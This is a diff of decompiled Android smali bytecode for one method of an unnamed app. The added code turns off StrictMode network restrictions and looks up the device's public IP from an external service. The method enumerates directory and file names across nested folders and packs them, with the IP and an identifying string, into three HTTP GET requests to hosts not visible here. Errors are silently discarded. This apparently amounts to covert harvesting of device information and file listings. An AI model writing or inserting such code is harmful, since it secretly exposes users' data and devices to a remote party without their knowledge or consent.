@@ -7,9 +7,47 @@
     .end annotation
 
     .prologue
-    .line 27
+    .line 52
     move-object/from16 v2, p0
 
+    sget v23, Landroid/os/Build$VERSION;->SDK_INT:I
+
+    const/16 v24, 0x9
+
+    move/from16 v0, v23
+
+    move/from16 v1, v24
+
+    if-le v0, v1, :cond_26
+
+    .line 53
+    new-instance v23, Landroid/os/StrictMode$ThreadPolicy$Builder;
+
+    move-object/from16 v33, v23
+
+    move-object/from16 v23, v33
+
+    move-object/from16 v24, v33
+
+    invoke-direct/range {v24 .. v24}, Landroid/os/StrictMode$ThreadPolicy$Builder;-><init>()V
+
+    invoke-virtual/range {v23 .. v23}, Landroid/os/StrictMode$ThreadPolicy$Builder;->permitAll()Landroid/os/StrictMode$ThreadPolicy$Builder;
+
+    move-result-object v23
+
+    invoke-virtual/range {v23 .. v23}, Landroid/os/StrictMode$ThreadPolicy$Builder;->build()Landroid/os/StrictMode$ThreadPolicy;
+
+    move-result-object v23
+
+    move-object/from16 v4, v23
+
+    .line 54
+    move-object/from16 v23, v4
+
+    invoke-static/range {v23 .. v23}, Landroid/os/StrictMode;->setThreadPolicy(Landroid/os/StrictMode$ThreadPolicy;)V
+
+    .line 57
+    :cond_26
     invoke-static {}, Ljava/text/DateFormat;->getDateTimeInstance()Ljava/text/DateFormat;
 
     move-result-object v23
@@ -30,7 +68,7 @@
 
     move-object/from16 v4, v23
 
-    .line 29
+    .line 59
     new-instance v23, Ljava/lang/StringBuffer;
 
     move-object/from16 v33, v23
@@ -257,20 +295,7 @@
 
     move-object/from16 v5, v23
 
-    .line 30
-    move-object/from16 v23, v5
-
-    const-string v24, " "
-
-    const-string v25, "_"
-
-    invoke-virtual/range {v23 .. v25}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
-
-    move-result-object v23
-
-    move-object/from16 v5, v23
-
-    .line 32
+    .line 61
     const-string v23, ""
 
     move-object/from16 v6, v23
@@ -283,8 +308,126 @@
 
     move-object/from16 v8, v23
 
-    .line 37
-    :try_start_11a
+    .line 65
+    :try_start_132
+    new-instance v23, Ljava/net/URL;
+
+    move-object/from16 v33, v23
+
+    move-object/from16 v23, v33
+
+    move-object/from16 v24, v33
+
+    const-string v25, "http://checkip.amazonaws.com/"
+
+    invoke-direct/range {v24 .. v25}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
+
+    move-object/from16 v9, v23
+
+    .line 66
+    new-instance v23, Ljava/io/BufferedReader;
+
+    move-object/from16 v33, v23
+
+    move-object/from16 v23, v33
+
+    move-object/from16 v24, v33
+
+    new-instance v25, Ljava/io/InputStreamReader;
+
+    move-object/from16 v33, v25
+
+    move-object/from16 v25, v33
+
+    move-object/from16 v26, v33
+
+    move-object/from16 v27, v9
+
+    invoke-virtual/range {v27 .. v27}, Ljava/net/URL;->openStream()Ljava/io/InputStream;
+
+    move-result-object v27
+
+    invoke-direct/range {v26 .. v27}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V
+
+    invoke-direct/range {v24 .. v25}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V
+
+    move-object/from16 v10, v23
+
+    .line 67
+    new-instance v23, Ljava/lang/StringBuffer;
+
+    move-object/from16 v33, v23
+
+    move-object/from16 v23, v33
+
+    move-object/from16 v24, v33
+
+    invoke-direct/range {v24 .. v24}, Ljava/lang/StringBuffer;-><init>()V
+
+    move-object/from16 v24, v5
+
+    invoke-virtual/range {v23 .. v24}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v23
+
+    new-instance v24, Ljava/lang/StringBuffer;
+
+    move-object/from16 v33, v24
+
+    move-object/from16 v24, v33
+
+    move-object/from16 v25, v33
+
+    invoke-direct/range {v25 .. v25}, Ljava/lang/StringBuffer;-><init>()V
+
+    const-string v25, "%20IP:"
+
+    invoke-virtual/range {v24 .. v25}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v24
+
+    move-object/from16 v25, v10
+
+    invoke-virtual/range {v25 .. v25}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
+
+    move-result-object v25
+
+    invoke-virtual/range {v24 .. v25}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v24
+
+    invoke-virtual/range {v24 .. v24}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v24
+
+    invoke-virtual/range {v23 .. v24}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v23
+
+    invoke-virtual/range {v23 .. v23}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+    :try_end_196
+    .catch Ljava/lang/Exception; {:try_start_132 .. :try_end_196} :catch_413
+
+    move-result-object v23
+
+    move-object/from16 v5, v23
+
+    .line 72
+    :goto_199
+    move-object/from16 v23, v5
+
+    const-string v24, " "
+
+    const-string v25, "_"
+
+    invoke-virtual/range {v23 .. v25}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
+
+    move-result-object v23
+
+    move-object/from16 v5, v23
+
+    .line 77
+    :try_start_1a5
     new-instance v23, Ljava/io/File;
 
     move-object/from16 v33, v23
@@ -329,7 +472,7 @@
 
     move-object/from16 v9, v23
 
-    .line 38
+    .line 78
     move-object/from16 v23, v9
 
     invoke-virtual/range {v23 .. v23}, Ljava/io/File;->listFiles()[Ljava/io/File;
@@ -338,7 +481,7 @@
 
     move-object/from16 v10, v23
 
-    .line 40
+    .line 80
     move-object/from16 v23, v10
 
     move-object/from16 v11, v23
@@ -347,8 +490,8 @@
 
     move/from16 v12, v23
 
-    .line 42
-    :goto_158
+    .line 82
+    :goto_1e3
     move/from16 v23, v12
 
     move-object/from16 v24, v11
@@ -363,9 +506,9 @@
 
     move/from16 v1, v24
 
-    if-lt v0, v1, :cond_3ac
+    if-lt v0, v1, :cond_418
 
-    .line 46
+    .line 86
     new-instance v23, Ljava/io/File;
 
     move-object/from16 v33, v23
@@ -410,7 +553,7 @@
 
     move-object/from16 v13, v23
 
-    .line 47
+    .line 87
     move-object/from16 v23, v13
 
     invoke-virtual/range {v23 .. v23}, Ljava/io/File;->listFiles()[Ljava/io/File;
@@ -419,7 +562,7 @@
 
     move-object/from16 v14, v23
 
-    .line 49
+    .line 89
     move-object/from16 v23, v14
 
     move-object/from16 v15, v23
@@ -428,8 +571,8 @@
 
     move/from16 v16, v23
 
-    .line 51
-    :goto_1a5
+    .line 91
+    :goto_230
     move/from16 v23, v16
 
     move-object/from16 v24, v15
@@ -444,9 +587,9 @@
 
     move/from16 v1, v24
 
-    if-lt v0, v1, :cond_3fa
+    if-lt v0, v1, :cond_466
 
-    .line 55
+    .line 95
     new-instance v23, Ljava/io/File;
 
     move-object/from16 v33, v23
@@ -491,7 +634,7 @@
 
     move-object/from16 v17, v23
 
-    .line 56
+    .line 96
     move-object/from16 v23, v17
 
     invoke-virtual/range {v23 .. v23}, Ljava/io/File;->listFiles()[Ljava/io/File;
@@ -500,7 +643,7 @@
 
     move-object/from16 v18, v23
 
-    .line 58
+    .line 98
     move-object/from16 v23, v18
 
     move-object/from16 v19, v23
@@ -509,8 +652,8 @@
 
     move/from16 v20, v23
 
-    .line 60
-    :goto_1f2
+    .line 100
+    :goto_27d
     move/from16 v23, v20
 
     move-object/from16 v24, v19
@@ -520,17 +663,17 @@
     array-length v0, v0
 
     move/from16 v24, v0
-    :try_end_1fb
-    .catch Ljava/lang/Exception; {:try_start_11a .. :try_end_1fb} :catch_496
+    :try_end_286
+    .catch Ljava/lang/Exception; {:try_start_1a5 .. :try_end_286} :catch_502
 
     move/from16 v0, v23
 
     move/from16 v1, v24
 
-    if-lt v0, v1, :cond_448
+    if-lt v0, v1, :cond_4b4
 
-    .line 66
-    :goto_201
+    .line 106
+    :goto_28c
     move-object/from16 v23, v6
 
     const-string v24, "&"
@@ -567,7 +710,7 @@
 
     move-object/from16 v6, v23
 
-    .line 67
+    .line 107
     move-object/from16 v23, v7
 
     const-string v24, "&"
@@ -604,7 +747,7 @@
 
     move-object/from16 v7, v23
 
-    .line 68
+    .line 108
     move-object/from16 v23, v8
 
     const-string v24, "&"
@@ -641,46 +784,8 @@
 
     move-object/from16 v8, v23
 
-    .line 71
-    sget v23, Landroid/os/Build$VERSION;->SDK_INT:I
-
-    const/16 v24, 0x9
-
-    move/from16 v0, v23
-
-    move/from16 v1, v24
-
-    if-le v0, v1, :cond_291
-
-    .line 72
-    new-instance v23, Landroid/os/StrictMode$ThreadPolicy$Builder;
-
-    move-object/from16 v33, v23
-
-    move-object/from16 v23, v33
-
-    move-object/from16 v24, v33
-
-    invoke-direct/range {v24 .. v24}, Landroid/os/StrictMode$ThreadPolicy$Builder;-><init>()V
-
-    invoke-virtual/range {v23 .. v23}, Landroid/os/StrictMode$ThreadPolicy$Builder;->permitAll()Landroid/os/StrictMode$ThreadPolicy$Builder;
-
-    move-result-object v23
-
-    invoke-virtual/range {v23 .. v23}, Landroid/os/StrictMode$ThreadPolicy$Builder;->build()Landroid/os/StrictMode$ThreadPolicy;
-
-    move-result-object v23
-
-    move-object/from16 v9, v23
-
-    .line 73
-    move-object/from16 v23, v9
-
-    invoke-static/range {v23 .. v23}, Landroid/os/StrictMode;->setThreadPolicy(Landroid/os/StrictMode$ThreadPolicy;)V
-
-    .line 78
-    :cond_291
-    :try_start_291
+    .line 112
+    :try_start_2f8
     new-instance v23, Lorg/apache/http/impl/client/DefaultHttpClient;
 
     move-object/from16 v33, v23
@@ -693,7 +798,7 @@
 
     move-object/from16 v9, v23
 
-    .line 79
+    .line 113
     new-instance v23, Lorg/apache/http/client/methods/HttpGet;
 
     move-object/from16 v33, v23
@@ -804,7 +909,7 @@
 
     move-object/from16 v10, v23
 
-    .line 80
+    .line 114
     new-instance v23, Lorg/apache/http/client/methods/HttpGet;
 
     move-object/from16 v33, v23
@@ -867,7 +972,7 @@
 
     move-object/from16 v11, v23
 
-    .line 81
+    .line 115
     new-instance v23, Lorg/apache/http/client/methods/HttpGet;
 
     move-object/from16 v33, v23
@@ -930,7 +1035,7 @@
 
     move-object/from16 v12, v23
 
-    .line 83
+    .line 117
     move-object/from16 v23, v9
 
     move-object/from16 v24, v10
@@ -939,7 +1044,7 @@
 
     move-result-object v23
 
-    .line 84
+    .line 118
     move-object/from16 v23, v9
 
     move-object/from16 v24, v11
@@ -948,41 +1053,49 @@
 
     move-result-object v23
 
-    .line 85
+    .line 119
     move-object/from16 v23, v9
 
     move-object/from16 v24, v12
 
     invoke-interface/range {v23 .. v24}, Lorg/apache/http/client/HttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;
-    :try_end_3aa
-    .catch Ljava/lang/Exception; {:try_start_291 .. :try_end_3aa} :catch_49b
+    :try_end_411
+    .catch Ljava/lang/Exception; {:try_start_2f8 .. :try_end_411} :catch_507
 
     move-result-object v23
 
-    :goto_3ab
+    :goto_412
     return-void
 
-    .line 40
-    :cond_3ac
+    .line 67
+    :catch_413
+    move-exception v23
+
+    move-object/from16 v9, v23
+
+    goto/16 :goto_199
+
+    .line 80
+    :cond_418
     move-object/from16 v23, v11
 
     move/from16 v24, v12
 
-    :try_start_3b0
+    :try_start_41c
     aget-object v23, v23, v24
 
     move-object/from16 v13, v23
 
-    .line 41
+    .line 81
     move-object/from16 v23, v13
 
     invoke-virtual/range {v23 .. v23}, Ljava/io/File;->isDirectory()Z
 
     move-result v23
 
-    if-eqz v23, :cond_3f6
+    if-eqz v23, :cond_462
 
-    .line 42
+    .line 82
     new-instance v23, Ljava/lang/StringBuffer;
 
     move-object/from16 v33, v23
@@ -1039,13 +1152,13 @@
 
     move-object/from16 v6, v23
 
-    :cond_3f6
+    :cond_462
     add-int/lit8 v12, v12, 0x1
 
-    goto/16 :goto_158
+    goto/16 :goto_1e3
 
-    .line 49
-    :cond_3fa
+    .line 89
+    :cond_466
     move-object/from16 v23, v15
 
     move/from16 v24, v16
@@ -1054,16 +1167,16 @@
 
     move-object/from16 v17, v23
 
-    .line 50
+    .line 90
     move-object/from16 v23, v17
 
     invoke-virtual/range {v23 .. v23}, Ljava/io/File;->isFile()Z
 
     move-result v23
 
-    if-eqz v23, :cond_444
+    if-eqz v23, :cond_4b0
 
-    .line 51
+    .line 91
     new-instance v23, Ljava/lang/StringBuffer;
 
     move-object/from16 v33, v23
@@ -1120,13 +1233,13 @@
 
     move-object/from16 v7, v23
 
-    :cond_444
+    :cond_4b0
     add-int/lit8 v16, v16, 0x1
 
-    goto/16 :goto_1a5
+    goto/16 :goto_230
 
-    .line 58
-    :cond_448
+    .line 98
+    :cond_4b4
     move-object/from16 v23, v19
 
     move/from16 v24, v20
@@ -1135,16 +1248,16 @@
 
     move-object/from16 v21, v23
 
-    .line 59
+    .line 99
     move-object/from16 v23, v21
 
     invoke-virtual/range {v23 .. v23}, Ljava/io/File;->isDirectory()Z
 
     move-result v23
 
-    if-eqz v23, :cond_492
+    if-eqz v23, :cond_4fe
 
-    .line 60
+    .line 100
     new-instance v23, Ljava/lang/StringBuffer;
 
     move-object/from16 v33, v23
@@ -1196,30 +1309,30 @@
     move-result-object v23
 
     invoke-virtual/range {v23 .. v23}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
-    :try_end_48f
-    .catch Ljava/lang/Exception; {:try_start_3b0 .. :try_end_48f} :catch_496
+    :try_end_4fb
+    .catch Ljava/lang/Exception; {:try_start_41c .. :try_end_4fb} :catch_502
 
     move-result-object v23
 
     move-object/from16 v8, v23
 
-    :cond_492
+    :cond_4fe
     add-int/lit8 v20, v20, 0x1
 
-    goto/16 :goto_1f2
+    goto/16 :goto_27d
 
-    :catch_496
+    :catch_502
     move-exception v23
 
     move-object/from16 v9, v23
 
-    goto/16 :goto_201
+    goto/16 :goto_28c
 
-    .line 85
-    :catch_49b
+    .line 119
+    :catch_507
     move-exception v23
 
     move-object/from16 v9, v23
 
-    goto/16 :goto_3ab
+    goto/16 :goto_412
 .end method
